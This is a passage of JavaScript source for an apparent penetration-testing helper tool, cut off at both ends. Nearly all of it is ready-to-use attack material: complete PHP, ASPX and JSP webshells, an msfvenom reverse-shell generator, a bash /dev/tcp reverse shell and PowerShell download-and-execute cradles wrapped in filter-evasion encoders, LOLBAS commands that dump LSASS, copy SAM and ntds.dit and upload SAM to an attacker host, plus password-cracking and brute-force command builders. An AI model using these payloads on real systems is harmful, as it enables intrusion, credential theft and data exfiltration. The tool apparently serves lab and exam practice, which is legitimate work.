    sig('sebackup', /SeBackupPrivilege|SeRestorePrivilege|BUILTIN\\Backup Operators/i, 'win', 'Backup / Restore privilege detected', 'Allows reading or writing any file on the filesystem, bypassing NTFS ACLs.', 'Copy SAM and SYSTEM registry hives (reg save HKLM\\SAM) or ntds.dit on a DC.'),
    sig('dnsadmins', /DnsAdmins/i, 'win', 'Member of DnsAdmins group', 'Can load an arbitrary DLL into the Domain Controller DNS service running as SYSTEM.', 'Generate a reverse shell DLL in Msfvenom Builder and load it via dnscmd.exe /config /serverlevelplugindll.'),
    sig('nopasswd', /NOPASSWD\s*:\s*([^\r\n]+)/i, 'win', 'Passwordless sudo rule (NOPASSWD)', 'This account can execute a command as root without knowing its own password.', 'Look up the permitted binary in the GTFOBins tab for an instant root escape.'),
    sig('dockergrp', /\b(?:\d+\(docker\)|\bdocker\b.*groups=|\(lxd\)|\(lxc\)|\(disk\)|\(shadow\))/i, 'win', 'Privileged Linux group membership (docker / lxd / disk / shadow)', 'Group membership grants direct host filesystem or shadow hash access.', 'Mount the host root filesystem (/) inside a container to read /root/root.txt or /etc/shadow.'),
    sig('alwaysinstall', /AlwaysInstallElevated\s+REG_DWORD\s+0x1/i, 'win', 'AlwaysInstallElevated is enabled (0x1)', 'Any low-privilege user can install an MSI package with NT AUTHORITY\\SYSTEM privileges.', 'Generate a reverse shell .msi in the Reverse Shell & Msfvenom tab and run msiexec /quiet /qn /i setup.msi.'),
  ];
  W.scanSignals = function (text) {
    text = String(text == null ? '' : text);
    var out = [], seen = {};
    for (var i = 0; i < OUTPUT_SIGNALS.length; i++) {
      var s = OUTPUT_SIGNALS[i], m = text.match(s.re);
      if (m && !seen[s.id]) { seen[s.id] = 1; out.push({ id: s.id, tone: s.tone, label: s.label || m[1] || m[0], meaning: s.meaning, next: s.next }); }
    }
    return out;
  };

  // ── TTY Stabilization, Msfvenom Stager Builder, and Webshells ───────────────────────────────
  W.TTY_RECIPES = [
    {
      id: 'linux-python', label: '1. Linux Python3 Full PTY Upgrade (Standard)', title: 'Linux Python3 Full PTY Upgrade (Standard)', os: 'linux',
      note: 'Upgrades a dumb reverse shell so Ctrl+C, arrow keys, tab-completion, su, and sudo work properly.',
      steps: [
        { locus: 'target$', note: '1. Spawn a PTY via Python', label: '1. Spawn a PTY via Python', cmd: 'python3 -c \'import pty;pty.spawn("/bin/bash")\' || python -c \'import pty;pty.spawn("/bin/bash")\'' },
        { locus: 'target$', note: '2. Export terminal type, then press Ctrl+Z to background the shell', label: '2. Export terminal type (then press Ctrl+Z to background)', cmd: 'export TERM=xterm-256color' },
        { locus: 'kali$',   note: '3. Pass raw keystrokes through Kali and foreground the shell', label: '3. Pass raw keystrokes through Kali and foreground the shell', cmd: 'stty raw -echo; fg' },
        { locus: 'target$', note: '4. Match terminal dimensions so vim/less do not wrap badly', label: '4. Match terminal dimensions so vim/less do not wrap badly', cmd: 'stty rows 48 cols 160' },
      ]
    },
    {
      id: 'linux-script', label: '2. Linux /usr/bin/script PTY Fallback (No Python)', title: 'Linux /usr/bin/script PTY Fallback (No Python)', os: 'linux',
      note: 'Use when python/python3 is not installed on the target Linux host.',
      steps: [
        { locus: 'target$', note: '1. Spawn a PTY with /usr/bin/script', label: '1. Spawn a PTY with /usr/bin/script', cmd: '/usr/bin/script -qc /bin/bash /dev/null' },
        { locus: 'target$', note: '2. Fix PATH and TERM', label: '2. Fix PATH and TERM', cmd: 'export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; export TERM=xterm' },
      ]
    },
    {
      id: 'win-rlwrap', label: '3. Windows rlwrap Listener & Arrow-Key History', title: 'Windows rlwrap Listener & Arrow-Key History', os: 'windows',
      note: 'Wrap your Kali netcat listener with rlwrap BEFORE catching a Windows shell to get up-arrow command history and line editing.',
      steps: [
        { locus: 'kali$', note: '1. Start listener wrapped in rlwrap', label: '1. Start listener wrapped in rlwrap', cmd: 'rlwrap -cAr nc -lvnp {{lport}}' },
      ]
    },
    {
      id: 'win-conpty', label: '4. Windows Full Interactive ConPTY Upgrade', title: 'Windows Full Interactive ConPTY Upgrade', os: 'windows',
      note: 'Gives a true interactive Windows console with tab-completion and arrow keys.',
      steps: [
        { locus: 'kali$', note: '1. Start raw ConPTY listener on Kali', label: '1. Start raw ConPTY listener on Kali', cmd: 'stty raw -echo; (stty size; cat) | nc -lvnp {{lport}}' },
        { locus: 'PS C:\\>', note: '2. Invoke ConPtyShell on Windows Target', label: '2. Invoke ConPtyShell on Windows Target', cmd: 'IEX(IWR http://{{lhost}}:8000/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {{lhost}} {{lport}}' },
      ]
    },
  ];

  W.MSFVENOM_RECIPES = [
    { id: 'linux-elf-x64', label: 'Linux x64 ELF Binary', os: 'linux', ext: 'rev.elf', payload: 'linux/x64/shell_reverse_tcp', fmt: 'elf',
      note: 'Stageless Linux binary. Catch with standard nc -lvnp {{lport}}.',
      runTpl: 'chmod +x /dev/shm/rev.elf && /dev/shm/rev.elf' },
    { id: 'win-exe-x64', label: 'Windows x64 EXE Binary', os: 'windows', ext: 'rev.exe', payload: 'windows/x64/shell_reverse_tcp', fmt: 'exe',
      note: 'Stageless Windows executable. Catch with rlwrap nc -lvnp {{lport}}.',
      runTpl: 'C:\\Windows\\Temp\\rev.exe' },
    { id: 'win-service-exe', label: 'Windows Service EXE (exe-service)', os: 'windows', ext: 'svc.exe', payload: 'windows/x64/shell_reverse_tcp', fmt: 'exe-service',
      note: 'Required when replacing a Windows service binary or abusing an unquoted service path (standard EXEs get killed by the Service Control Manager after 30 seconds).',
      runTpl: 'sc.exe stop VulnService && sc.exe start VulnService' },
    { id: 'win-dll-x64', label: 'Windows x64 DLL (Hijack / DnsAdmins)', os: 'windows', ext: 'hijack.dll', payload: 'windows/x64/shell_reverse_tcp', fmt: 'dll',
      note: 'For DLL hijacking or DnsAdmins ServerLevelPluginDll abuse.',
      runTpl: 'rundll32.exe C:\\Windows\\Temp\\hijack.dll,StartW' },
    { id: 'win-msi', label: 'Windows MSI Package (AlwaysInstallElevated)', os: 'windows', ext: 'setup.msi', payload: 'windows/x64/shell_reverse_tcp', fmt: 'msi',
      note: 'For AlwaysInstallElevated (0x1) privilege escalation to SYSTEM.',
      runTpl: 'msiexec /quiet /qn /i C:\\Windows\\Temp\\setup.msi' },
    { id: 'web-aspx', label: 'IIS ASPX Reverse Shell', os: 'windows', ext: 'shell.aspx', payload: 'windows/x64/shell_reverse_tcp', fmt: 'aspx',
      note: 'Upload to an IIS web root and trigger via curl.',
      runTpl: 'curl -fsSL http://{{target}}/shell.aspx' },
    { id: 'web-war', label: 'Tomcat WAR Archive', os: 'linux', ext: 'shell.war', payload: 'java/jsp_shell_reverse_tcp', fmt: 'war',
      note: 'Deploy via Tomcat /manager/html or /manager/text and request /shell/.',
      runTpl: 'curl -fsSL http://{{target}}:8080/shell/' },
  ];

  W.buildMsfvenom = function (recipeId, lhostOrVals, lportArg) {
    var lhost = '{{lhost}}', lport = '{{lport}}', target = '{{target}}';
    if (lhostOrVals && typeof lhostOrVals === 'object') {
      lhost = lhostOrVals.lhost || '{{lhost}}';
      lport = lhostOrVals.lport || '{{lport}}';
      target = lhostOrVals.target || '{{target}}';
    } else {
      if (lhostOrVals) lhost = String(lhostOrVals);
      if (lportArg) lport = String(lportArg);
    }
    var r = W.MSFVENOM_RECIPES.filter(function (x) { return x.id === recipeId; })[0] || W.MSFVENOM_RECIPES[0];
    var gen = 'msfvenom -p ' + r.payload + ' LHOST=' + lhost + ' LPORT=' + lport + ' -f ' + r.fmt + ' -o ' + r.ext;
    var listener = (r.os === 'windows' ? 'rlwrap -cAr ' : '') + 'nc -lvnp ' + lport;
    var runCmd = String(r.runTpl || '').replace(/\{\{lhost\}\}/g, lhost).replace(/\{\{lport\}\}/g, lport).replace(/\{\{target\}\}/g, target);
    var note = String(r.note || '').replace(/\{\{lhost\}\}/g, lhost).replace(/\{\{lport\}\}/g, lport);
    return {
      id: r.id, label: r.label, note: note,
      generate: gen, listener: listener, run: runCmd,
      recipe: r, genCmd: gen, listenerCmd: listener, runCmd: runCmd
    };
  };

  W.WEBSHELLS = [
    { id: 'php-tiny', label: 'PHP Tiny GET Shell', os: 'linux', file: 'cmd.php', ext: '.php',
      code: '<?php system($_GET["c"]); ?>', payload: '<?php system($_GET["c"]); ?>',
      trigger: 'curl -G "http://{{target}}/cmd.php" --data-urlencode "c=id;hostname"',
      usage: 'curl -G "http://{{target}}/cmd.php" --data-urlencode "c=id;hostname"',
      note: 'Smallest 29-byte PHP webshell. Pass commands via the ?c= parameter.' },
    { id: 'php-fallback', label: 'PHP Multi-Function Fallback', os: 'linux', file: 'shell.php', ext: '.php',
      code: '<?php $c=$_REQUEST["c"]; if(function_exists("system")){system($c);}elseif(function_exists("passthru")){passthru($c);}elseif(function_exists("shell_exec")){echo shell_exec($c);} ?>',
      payload: '<?php $c=$_REQUEST["c"]; if(function_exists("system")){system($c);}elseif(function_exists("passthru")){passthru($c);}elseif(function_exists("shell_exec")){echo shell_exec($c);} ?>',
      trigger: 'curl -G "http://{{target}}/shell.php" --data-urlencode "c=id"',
      usage: 'curl -G "http://{{target}}/shell.php" --data-urlencode "c=id"',
      note: 'Survives disable_functions restrictions when only one execution primitive is blocked.' },
    { id: 'aspx-cmd', label: 'IIS ASPX Command Webshell', os: 'windows', file: 'cmd.aspx', ext: '.aspx',
      code: '<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><% string c=Request["c"]; if(c!=null){Process p=new Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+c;p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write(p.StandardOutput.ReadToEnd());} %>',
      payload: '<%@ Page Language="C#" %><%@ Import Namespace="System.Diagnostics" %><% string c=Request["c"]; if(c!=null){Process p=new Process();p.StartInfo.FileName="cmd.exe";p.StartInfo.Arguments="/c "+c;p.StartInfo.UseShellExecute=false;p.StartInfo.RedirectStandardOutput=true;p.Start();Response.Write(p.StandardOutput.ReadToEnd());} %>',
      trigger: 'curl -G "http://{{target}}/cmd.aspx" --data-urlencode "c=whoami /all"',
      usage: 'curl -G "http://{{target}}/cmd.aspx" --data-urlencode "c=whoami /all"',
      note: 'Compact C# ASPX webshell for IIS servers.' },
    { id: 'jsp-cmd', label: 'Java / Tomcat JSP Webshell', os: 'linux', file: 'cmd.jsp', ext: '.jsp',
      code: '<% if(request.getParameter("c")!=null){Process p=Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",request.getParameter("c")});java.util.Scanner s=new java.util.Scanner(p.getInputStream()).useDelimiter("\\\\A");out.print(s.hasNext()?s.next():"");} %>',
      payload: '<% if(request.getParameter("c")!=null){Process p=Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",request.getParameter("c")});java.util.Scanner s=new java.util.Scanner(p.getInputStream()).useDelimiter("\\\\A");out.print(s.hasNext()?s.next():"");} %>',
      trigger: 'curl -G "http://{{target}}:8080/cmd.jsp" --data-urlencode "c=id"',
      usage: 'curl -G "http://{{target}}:8080/cmd.jsp" --data-urlencode "c=id"',
      note: 'Executes commands through /bin/sh -c on Tomcat, Jetty, or JBoss.' },
  ];

  // ── WAF, Filter Evasion & Time-Saving Scenario Recipes ──────────────────────────────────────
  W.CODEC_SCENARIOS = [
    {
      id: 'linux-rce',
      color: 'cyan',
      badge: 'Linux Shell Wrapper',
      title: '1. Linux Command Breaking on Bad Chars (|, &, >, Quotes)',
      when: 'Use when your Linux command or reverse shell works locally, but fails inside a web parameter, curl request, cron job, or RCE field because pipes, redirects, or quotes get mangled.',
      sample: 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'
    },
    {
      id: 'win-psenc',
      color: 'amber',
      badge: 'Windows PowerShell',
      title: '2. Windows PowerShell -EncodedCommand (UTF-16LE)',
      when: 'Use when running PowerShell from cmd.exe, a web shell, xp_cmdshell, or a scheduled task where quotes, $, or & break execution.',
      sample: 'IEX(New-Object Net.WebClient).DownloadString("http://10.10.14.2:8000/shell.ps1")'
    },
    {
      id: 'space-slash',
      color: 'emerald',
      badge: 'Command Injection Bypass',
      title: '3. Command Injection: Spaces or Slashes (/) Blocked',
      when: 'Use when a web form (such as a ping/diagnostic input) lets you inject ; or |, but strips spaces or rejects / path characters.',
      sample: 'cat /etc/passwd'
    },
    {
      id: 'quote-free',
      color: 'violet',
      badge: 'SQLi & XSS Filter Bypass',
      title: '4. SQLi or XSS: Single & Double Quotes Blocked',
      when: 'Use when a WAF or magic_quotes blocks \' and ", preventing you from writing string literals like \'admin\' or \'/var/www/html/cmd.php\'.',
      sample: '/var/www/html/cmd.php'
    }
  ];

  W.buildCodecScenario = function (scenarioId, text, params) {
    var s = String(text == null ? '' : text);
    var scen = W.CODEC_SCENARIOS.filter(function (x) { return x.id === scenarioId; })[0] || W.CODEC_SCENARIOS[0];
    var bytes = utf8Bytes(s);
    var hex = W.hexEnc(s);
    var decCodes = bytes.join(',');
    var b64 = W.b64(s);
    var psb64 = W.psEnc(s);
    var braceParts = s.trim().split(/\s+/).filter(Boolean);
    var braceOut = braceParts.length > 1 ? ('{' + braceParts.map(function (pt) { return pt.replace(/,/g, '\\,'); }).join(',') + '}') : s;
    var items = [];

    if (scen.id === 'win-psenc') {
      var fullPs = 'powershell.exe -nop -w hidden -enc ' + psb64;
      items = [
        { id: 'ps-full', label: 'Ready-to-Run PowerShell -EncodedCommand', locus: 'C:\\>', note: 'Drop directly into cmd.exe, a webshell, or xp_cmdshell. Zero quotes or special characters.', out: fullPs },
        { id: 'ps-b64only', label: 'Raw UTF-16LE Base64 Blob Only', locus: 'encoded', note: 'Just the UTF-16LE Base64 string if your template already has powershell -enc.', out: psb64 },
        { id: 'ps-url', label: 'URL-Encoded PowerShell One-Liner (for GET/POST RCE)', locus: 'url', note: 'Paste directly into a URL query parameter (?cmd=...) in Burp or curl.', out: W.urlEnc(fullPs) },
      ];
    } else if (scen.id === 'space-slash') {
      var slashBypass = s.replace(/\//g, '${PATH:0:1}');
      var bothBypass = W.ifsEvade(s).replace(/\//g, '${PATH:0:1}');
      items = [
        { id: 'ifs', label: 'Bash ${IFS} Space Bypass', locus: 'target$', note: 'Replaces every space with ${IFS} (Internal Field Separator) in bash/sh.', out: W.ifsEvade(s) },
        { id: 'brace', label: 'Bash {cmd,arg} Brace Expansion (Zero Spaces)', locus: 'target$', note: 'Executes a command and its arguments in bash without any space characters.', out: braceOut },
        { id: 'slash', label: 'Linux ${PATH:0:1} Slash (/) Bypass', locus: 'target$', note: 'Since $PATH begins with /usr..., ${PATH:0:1} evaluates to / without typing a slash.', out: slashBypass },
        { id: 'both', label: 'Combined Space (${IFS}) + Slash (${PATH:0:1}) Bypass', locus: 'target$', note: 'Evades filters that block both spaces and forward slashes simultaneously.', out: bothBypass },
      ];
    } else if (scen.id === 'quote-free') {
      var pgChr = bytes.length ? bytes.map(function (b) { return 'CHR(' + b + ')'; }).join('||') : '';
      items = [
        { id: 'sqlhex', label: 'MySQL / MSSQL Hex Literal (0x...)', locus: 'sql>', note: 'Drop 0x... directly wherever a quoted string would go in MySQL or MSSQL.', out: hex ? ('0x' + hex) : '' },
        { id: 'sqlchar', label: 'SQL CHAR(...) Expression (MSSQL / MySQL / SQLite)', locus: 'sql>', note: 'Builds the string from ASCII codes with zero quotes.', out: bytes.length ? ('CHAR(' + decCodes + ')') : '' },
        { id: 'pgchr', label: 'PostgreSQL / Oracle CHR(...) Concatenation', locus: 'sql>', note: 'Builds a quote-free string in PostgreSQL or Oracle.', out: pgChr },
        { id: 'jschar', label: 'JavaScript String.fromCharCode(...) (Quote-Free XSS)', locus: 'js>', note: 'Constructs a JS string without single quotes, double quotes, or slashes.', out: bytes.length ? ('String.fromCharCode(' + decCodes + ')') : '' },
      ];
    } else {
      var stdRunner = W.linuxB64Runner(s, 'bash');
      var ifsRunner = 'echo${IFS}' + b64 + '|base64${IFS}-d|bash';
      items = [
        { id: 'b64bash', label: 'Standard Linux Base64 Pipe Runner', locus: 'target$', note: 'Wraps your command in Base64 so pipes, redirects (>&), and quotes cannot break.', out: stdRunner },
        { id: 'b64ifs', label: 'Spaceless Base64 Runner (No Spaces + No Bad Chars)', locus: 'target$', note: 'Use when the RCE field also breaks on spaces as well as special characters.', out: ifsRunner },
        { id: 'b64url', label: 'URL-Encoded Base64 Runner (Ready for GET/POST Parameter)', locus: 'url', note: 'Paste directly into a URL query string (?cmd=...) in Burp Repeater or curl.', out: W.urlEnc(stdRunner) },
      ];
    }
    return { scenario: scen, items: items };
  };

  W.evasionTransforms = function (text) {
    var s = String(text == null ? '' : text);
    var bytes = utf8Bytes(s);
    var hex = W.hexEnc(s);
    var decCodes = bytes.join(',');
    var braceParts = s.trim().split(/\s+/).filter(Boolean);
    var braceOut = braceParts.length > 1 ? ('{' + braceParts.map(function (p) { return p.replace(/,/g, '\\,'); }).join(',') + '}') : s;
    return [
      { id: 'ifs', label: 'Bash ${IFS} Space Bypass', note: 'Replaces spaces with ${IFS} when a command-injection filter strips spaces.', out: W.ifsEvade(s) },
      { id: 'brace', label: 'Bash Brace Expansion', note: 'Executes a command with arguments without using any spaces.', out: braceOut },
      { id: 'b64bash', label: 'Linux Base64 Pipe Runner', note: 'Eliminates quotes, pipes, and redirects so the payload survives web/CLI filters.', out: W.linuxB64Runner(s, 'bash') },
      { id: 'psenc', label: 'PowerShell -EncodedCommand', note: 'UTF-16LE Base64 one-liner for Windows command execution without quoting issues.', out: 'powershell -nop -w hidden -enc ' + W.psEnc(s) },
      { id: 'sqlhex', label: 'SQL Hex Literal (0x...)', note: 'Replaces quoted strings in MySQL/MSSQL queries when single and double quotes are blocked.', out: hex ? ('0x' + hex) : '' },
      { id: 'sqlchar', label: 'SQL CHAR(...) Expression', note: 'Builds a string without quotes in SQL Server / MySQL / SQLite.', out: bytes.length ? ('CHAR(' + decCodes + ')') : '' },
      { id: 'jschar', label: 'JS String.fromCharCode(...)', note: 'Builds a JavaScript string without quotes or slashes for XSS filters.', out: bytes.length ? ('String.fromCharCode(' + decCodes + ')') : '' },
    ];
  };

  // ── *2john File Hash Extractors & Crack Pipeline ────────────────────────────────────────────
  W.JOHN_EXTRACTORS = [
    { id: 'ssh2john', tool: 'ssh2john', file: 'id_rsa', label: 'SSH Private Key (id_rsa)', cmd: 'ssh2john id_rsa > id_rsa.hash', extractCmd: 'ssh2john id_rsa > id_rsa.hash', mode: 22911, john: 'SSH', note: 'Extracts the passphrase hash from an encrypted PEM/OpenSSH private key.' },
    { id: 'zip2john', tool: 'zip2john', file: 'backup.zip', label: 'ZIP Archive (.zip)', cmd: 'zip2john backup.zip > zip.hash', extractCmd: 'zip2john backup.zip > zip.hash', mode: 17200, john: 'PKZIP', note: 'Extracts PKZIP / WinZip AES hash from password-protected ZIP files.' },
    { id: 'rar2john', tool: 'rar2john', file: 'secret.rar', label: 'RAR Archive (.rar)', cmd: 'rar2john secret.rar > rar.hash', extractCmd: 'rar2john secret.rar > rar.hash', mode: 13000, john: 'rar5', note: 'Extracts RAR3 (-m 12500) or RAR5 (-m 13000) archive password hashes.' },
    { id: 'keepass2john', tool: 'keepass2john', file: 'Database.kdbx', label: 'KeePass Vault (.kdbx)', cmd: 'keepass2john Database.kdbx > kdbx.hash', extractCmd: 'keepass2john Database.kdbx > kdbx.hash', mode: 13400, john: 'KeePass', note: 'Extracts the master password hash from a KeePass .kdbx database.' },
    { id: 'office2john', tool: 'office2john', file: 'payroll.xlsx', label: 'MS Office Doc (.docx/.xlsx)', cmd: 'office2john payroll.xlsx > office.hash', extractCmd: 'office2john payroll.xlsx > office.hash', mode: 9600, john: 'office', note: 'Extracts Office 2007/2010/2013+ encryption hashes.' },
    { id: 'pfx2john', tool: 'pfx2john', file: 'cert.pfx', label: 'PKCS#12 Certificate (.pfx/.p12)', cmd: 'pfx2john cert.pfx > pfx.hash', extractCmd: 'pfx2john cert.pfx > pfx.hash', mode: 24410, john: 'pfx', note: 'Extracts the import password hash from an ADCS or TLS .pfx bundle.' },
    { id: '7z2john', tool: '7z2john', file: 'archive.7z', label: '7-Zip Archive (.7z)', cmd: '7z2john archive.7z > 7z.hash', extractCmd: '7z2john archive.7z > 7z.hash', mode: 11600, john: '7z', note: 'Extracts 7-Zip archive password hash (requires perl 7z2john.pl on Kali).' },
    { id: 'pdf2john', tool: 'pdf2john', file: 'confidential.pdf', label: 'Encrypted PDF (.pdf)', cmd: 'pdf2john confidential.pdf > pdf.hash', extractCmd: 'pdf2john confidential.pdf > pdf.hash', mode: 10500, john: 'PDF', note: 'Extracts owner/user password hash from a protected PDF.' },
  ];

  W.crackPipelineCmds = function (candOrMode, johnOrClean, cleanOrOpts, userArg) {
    var mode = null, john = null, cleanedHash = '', hf = 'hash.txt', wl = '/usr/share/wordlists/rockyou.txt', user = '';
    if (candOrMode && typeof candOrMode === 'object') {
      mode = candOrMode.mode;
      john = candOrMode.john;
      cleanedHash = johnOrClean || '';
      var opts = cleanOrOpts || {};
      hf = opts.hashfile || hf;
      wl = opts.wordlist || wl;
      user = opts.username || '';
    } else {
      mode = candOrMode;
      john = johnOrClean;
      cleanedHash = cleanOrOpts || '';
      user = userArg || '';
    }
    var cmds = [];
    var safeHash = String(cleanedHash || '').replace(/'/g, "'\\''");
    if (mode != null) {
      cmds.push({ label: 'Standard Dictionary Crack (Hashcat)', locus: 'kali$', cmd: W.hashcatCmd(mode, hf, wl) });
      cmds.push({ label: 'Rule-Boosted Crack (best64.rule)', locus: 'kali$', cmd: 'hashcat -m ' + mode + ' ' + hf + ' ' + wl + ' -r /usr/share/hashcat/rules/best64.rule' });
      if (safeHash && safeHash.length < 320) {
        cmds.push({ label: 'One-Liner Save + Crack + Show', locus: 'kali$', cmd: "echo '" + safeHash + "' > " + hf + ' && hashcat -m ' + mode + ' ' + hf + ' ' + wl + ' && hashcat -m ' + mode + ' ' + hf + ' --show' });
      }
      if (user) {
        cmds.push({ label: 'Crack Pasted user:hash File Directly (--username)', locus: 'kali$', cmd: 'hashcat --username -m ' + mode + ' ' + hf + ' ' + wl });
      }
    }
    if (john) {
      cmds.push({ label: 'John the Ripper Dictionary Crack', locus: 'kali$', cmd: W.johnCmd(john, hf, wl) });
      cmds.push({ label: 'Show Cracked Passwords (John)', locus: 'kali$', cmd: 'john --format=' + john + ' --show ' + hf });
    }
    return cmds;
  };

  // ── Windows LOLBAS (Living Off The Land Binaries & Scripts) ─────────────────────────────────
  var _LOLBAS_LIST = [
    { key: 'certutil', bin: 'certutil.exe', url: 'https://lolbas-project.github.io/lolbas/Binaries/Certutil/', fns: {
      'Download': [{ description: 'Download payload over HTTP without PowerShell.', code: 'certutil.exe -urlcache -split -f http://{{lhost}}:8000/nc64.exe C:\\Windows\\Temp\\nc64.exe' }],
      'Encode / Decode': [
        { description: 'Base64-encode a local file for copy-paste exfiltration.', code: 'certutil.exe -encode C:\\Windows\\Repair\\SAM C:\\Windows\\Temp\\sam.b64' },
        { description: 'Decode a base64 payload staged on target.', code: 'certutil.exe -decode C:\\Windows\\Temp\\payload.b64 C:\\Windows\\Temp\\payload.exe' }
      ]
    }},
    { key: 'powershell', bin: 'powershell.exe', url: 'https://lolbas-project.github.io/lolbas/', fns: {
      'Download': [
        { description: 'Download a file to disk with Invoke-WebRequest.', code: 'powershell -nop -c "iwr -Uri http://{{lhost}}:8000/winPEASx64.exe -OutFile C:\\Windows\\Temp\\winPEASx64.exe -UseBasicParsing"' },
        { description: 'Fileless in-memory execution via WebClient DownloadString.', code: 'powershell -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString(\'http://{{lhost}}:8000/shell.ps1\')"' }
      ],
      'Privilege Escalation': [
        { description: 'Read PowerShell command history across all users.', code: 'type C:\\Users\\*\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt' }
      ]
    }},
    { key: 'rundll32', bin: 'rundll32.exe', url: 'https://lolbas-project.github.io/lolbas/Binaries/Rundll32/', fns: {
      'Execute': [{ description: 'Execute an exported function from a staged DLL.', code: 'rundll32.exe C:\\Windows\\Temp\\hijack.dll,StartW' }],
      'Credentials': [{ description: 'Dump LSASS memory without procdump using comsvcs.dll (requires SeDebugPrivilege / Admin).', code: 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump <LSASS_PID> C:\\Windows\\Temp\\lsass.dmp full' }]
    }},
    { key: 'regsvr32', bin: 'regsvr32.exe', url: 'https://lolbas-project.github.io/lolbas/Binaries/Regsvr32/', fns: {
      'Execute': [{ description: 'Silently register/execute a staged DLL.', code: 'regsvr32.exe /s /n /u /i:http://{{lhost}}:8000/payload.sct scrobj.dll' }]
    }},
    { key: 'msiexec', bin: 'msiexec.exe', url: 'https://lolbas-project.github.io/lolbas/Binaries/Msiexec/', fns: {
      'Privilege Escalation': [
        { description: 'Install a malicious MSI silently (escalates to SYSTEM when AlwaysInstallElevated is 0x1).', code: 'msiexec.exe /quiet /qn /i C:\\Windows\\Temp\\setup.msi' },
        { description: 'Execute an MSI directly from a remote HTTP server.', code: 'msiexec.exe /q /i http://{{lhost}}:8000/setup.msi' }
      ]
    }},
    { key: 'cmdkey', bin: 'cmdkey.exe', url: 'https://lolbas-project.github.io/lolbas/', fns: {
      'Credentials': [{ description: 'List cached Windows Vault credentials (pair with runas /savecred).', code: 'cmdkey /list' }]
    }},
    { key: 'runas', bin: 'runas.exe', url: 'https://lolbas-project.github.io/lolbas/', fns: {
      'Privilege Escalation': [{ description: 'Execute a reverse shell as Administrator using cached credentials shown in cmdkey /list.', code: 'runas /savecred /user:Administrator "C:\\Windows\\Temp\\nc64.exe {{lhost}} {{lport}} -e cmd.exe"' }]
    }},
    { key: 'vssadmin', bin: 'vssadmin.exe', url: 'https://lolbas-project.github.io/lolbas/', fns: {
      'Credentials': [{ description: 'Create a Volume Shadow Copy to read locked ntds.dit or SAM/SYSTEM hives.', code: 'vssadmin create shadow /for=C: && copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\Windows\\Temp\\ntds.dit' }]
    }},
    { key: 'reg', bin: 'reg.exe', url: 'https://lolbas-project.github.io/lolbas/Binaries/Reg/', fns: {
      'Credentials': [{ description: 'Export SAM, SYSTEM, and SECURITY hives for offline secretsdump extraction.', code: 'reg save HKLM\\SAM C:\\Windows\\Temp\\sam.save && reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.save' }]
    }},
    { key: 'robocopy', bin: 'robocopy.exe', url: 'https://lolbas-project.github.io/lolbas/', fns: {
      'File Copy': [{ description: 'Copy protected files in Backup Mode (/B) when holding SeBackupPrivilege.', code: 'robocopy /B C:\\Users\\Administrator\\Desktop C:\\Windows\\Temp root.txt' }]
    }},
    { key: 'icacls', bin: 'icacls.exe', url: 'https://lolbas-project.github.io/lolbas/', fns: {
      'Privilege Escalation': [{ description: 'Grant full control on a service binary or config after taking ownership.', code: 'icacls "C:\\Program Files\\VulnSvc\\svc.exe" /grant Everyone:F' }]
    }},
    { key: 'curl', bin: 'curl.exe', url: 'https://lolbas-project.github.io/lolbas/Binaries/Curl/', fns: {
      'Download': [{ description: 'Built into Windows 10 (1803+) and Server 2019+: fast HTTP file download.', code: 'curl.exe -s http://{{lhost}}:8000/nc64.exe -o C:\\Windows\\Temp\\nc64.exe' }],
      'Upload': [{ description: 'Exfiltrate a file back to a Kali HTTP listener.', code: 'curl.exe -X POST http://{{lhost}}:8000/upload -F "files=@C:\\Windows\\Temp\\sam.save"' }]
    }}
  ];
  _LOLBAS_LIST.forEach(function (item) { _LOLBAS_LIST[item.key] = item; });
  W.LOLBAS = _LOLBAS_LIST;

  // ── Wordlist Fuzzing Tool Switcher & Custom Generators ──────────────────────────────────────
  W.fuzzCmd = function (toolOrOpts, taskArg, targetArg, pathArg, extArg) {
    var opts = (toolOrOpts && typeof toolOrOpts === 'object') ? toolOrOpts : {
      tool: toolOrOpts, task: taskArg, target: targetArg, path: pathArg, ext: extArg
    };
    var task = opts.task || 'dirs';
    var tool = opts.tool || (task === 'dirs' ? 'gobuster' : 'ffuf');
    var path = opts.path || '/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt';
    var tgt = opts.target || '<target>';
    var dom = opts.domain || 'acme.internal';
    var usr = opts.user || 'bob';
    var ext = opts.ext ? String(opts.ext).replace(/^\./, '') : '';
    var dotExt = ext ? ('.' + ext.split(',').map(function (e) { return e.trim().replace(/^\./, ''); }).join(',.')) : '';
    if (task === 'users') {
      if (tool === 'kerbrute') return 'kerbrute userenum -d ' + dom + ' --dc ' + tgt + ' ' + path;
      if (tool === 'hydra') return "hydra -L " + path + " -p 'Autumn2026!' ssh://" + tgt;
      if (tool === 'ffuf') return 'ffuf -u http://' + tgt + '/login -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=FUZZ&password=Password123!" -w ' + path + ' -fs 0';
      return "nxc smb " + tgt + " -u " + path + " -p '' --continue-on-success";
    }
    if (task === 'passwords') {
      if (tool === 'hashcat') return 'hashcat -m 1000 hashes.txt ' + path + ' -r /usr/share/hashcat/rules/best64.rule -O';
      if (tool === 'john') return 'john --wordlist=' + path + ' --rules hashes.txt';
      if (tool === 'hydra') return 'hydra -l ' + usr + ' -P ' + path + ' ssh://' + tgt;
      if (tool === 'ffuf') return 'ffuf -u http://' + tgt + '/login -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=' + usr + '&password=FUZZ" -w ' + path + ' -fc 200';
      return 'nxc smb ' + tgt + ' -u ' + usr + ' -p ' + path + ' --continue-on-success';
    }
    if (task === 'lfi') {
